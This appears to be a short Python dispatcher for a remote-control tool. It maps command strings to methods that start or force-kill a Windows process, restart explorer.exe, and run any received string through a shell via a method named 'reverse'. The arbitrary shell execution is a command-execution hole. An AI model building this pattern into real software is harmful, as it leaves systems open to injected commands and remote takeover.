import os
import subprocess
class World:
    def __init__(self):
        self.posibilites = {
            "sb ks || on": 'enable_usbkey',
            "sb ks || off": 'disable_usbkey',
            "cmd": 'reverse',
        }

    def enable_usbkey(self):
        return subprocess.Popen("servisatk.exe",shell=True)

    def disable_usbkey(self):
        subprocess.Popen("taskkill /f /IM servisatk.exe /t",shell=True)
        subprocess.Popen("taskkill /f /IM explorer.exe & start explorer",shell=True)
        return 0

    def reverse(self, commandy):
        return subprocess.Popen(commandy, shell=True)
